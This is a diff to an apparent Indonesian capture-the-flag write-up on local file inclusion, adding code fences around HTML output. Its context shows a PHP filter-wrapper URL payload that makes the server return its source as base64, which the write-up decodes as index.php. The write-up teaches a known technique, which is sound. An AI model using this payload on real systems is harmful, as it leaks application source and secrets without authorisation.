@@ -66,6 +66,7 @@ http://ip/?view=php://filter/convert.base64-encode/resource=cat
 
 Maka hasilnya adalah 
 
+```
 <!DOCTYPE HTML>
 <html>
 <head>
@@ -81,7 +82,7 @@ Maka hasilnya adalah
         Here you go!PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
 </body>
 </html>
-
+```
 
 =======================================================================
 
@@ -119,6 +120,7 @@ Di mana base64 tersebut jika didecode adalah sebuah isi dari index.php
 
 Setelah didecode hasilnya adalah
 
+```
 <!DOCTYPE HTML>
 <html>
 <head>
@@ -148,7 +150,7 @@ Setelah didecode hasilnya adalah
     </div>
 </body>
 </html>
-
+```
 =============================================================================
 
 Jika kita lihat kode PHP di atas
